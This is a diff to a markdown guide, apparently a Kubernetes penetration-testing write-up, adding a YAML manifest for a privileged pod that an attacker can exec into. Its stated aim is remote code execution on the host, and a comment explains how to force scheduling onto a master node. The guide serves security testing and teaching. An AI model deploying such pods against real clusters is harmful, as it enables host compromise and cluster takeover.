@@ -4,8 +4,25 @@ If you only have `privileged=true`, you can still get RCE on the host, and ultim
 
 # Pod Creation
 
-
 ### Create a pod you can exec into
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-priv-only
+  labels: 
+    app: priv-only
+spec:
+  containers:
+  - name: priv-only
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+    securityContext:
+      privileged: true
+  # Force scheduling of your pod on a master mode by uncommenting the next line and changing the nodeName to that of a master node
+  #nodeName: k8s-master
+  ```
 [pod-priv-only.yaml](pod-priv-only.yaml)
 
 #### Option 1: Create pod from local yaml 
